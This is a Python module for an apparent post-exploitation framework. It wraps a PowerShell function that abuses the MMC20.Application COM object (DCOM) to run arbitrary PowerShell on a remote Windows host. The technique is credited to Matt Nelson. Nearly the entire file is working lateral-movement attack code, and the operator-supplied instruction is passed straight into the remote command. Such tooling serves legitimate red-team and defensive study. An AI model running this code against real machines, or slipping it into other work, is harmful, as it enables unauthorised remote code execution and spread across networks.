from termcolor import colored, cprint
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "MMC20-ExecuteShellCommand",
                       "Description": "Lateral Movement MMC20",
                       "Author": "Matt Nelson",
                       "Link": "https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/",
                       "License": "BSD 3-Clause",
                       "Module": "@josueencinar, @pablogonzalezpe"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                    "target": [None, "Windows IP you want to access", True],
                    "instruction": [None, "PS Code to execute in the remote machine", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = """
           function MMC20-ExecuteShellCommand {
                param(
                    [Parameter(Mandatory)]
                    [String] $instruction,
                    [Parameter(Mandatory)]
                    [String] $target
                )
                    $progID = "MMC20.Application"
                    $mmc = [activator]::CreateInstance([type]::GetTypeFromProgID($progID, $target))
                    $mmc.Document.ActiveView.ExecuteShellCommand("powershell", $null , "-C $instruction", "7")
            }
        """
        function += 'MMC20-ExecuteShellCommand -instruction {} -target "{}"'.format(self.args["instruction"], self.args["target"])
        super(CustomModule, self).run(function)
